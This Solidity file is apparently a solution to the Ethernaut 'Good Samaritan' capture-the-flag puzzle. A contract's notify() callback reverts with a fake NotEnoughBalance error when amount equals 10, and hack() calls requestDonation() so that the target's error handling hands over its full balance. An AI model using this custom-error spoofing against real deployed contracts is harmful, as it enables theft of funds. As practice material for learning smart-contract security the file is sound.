// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract GoodSamaritanHacker is INotifyable {
  error NotEnoughBalance();

  function notify(uint256 amount) external override {
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }

  function hack(address _targetAddr) external {
    GoodSamaritan target = GoodSamaritan(_targetAddr);
    target.requestDonation();
  }
}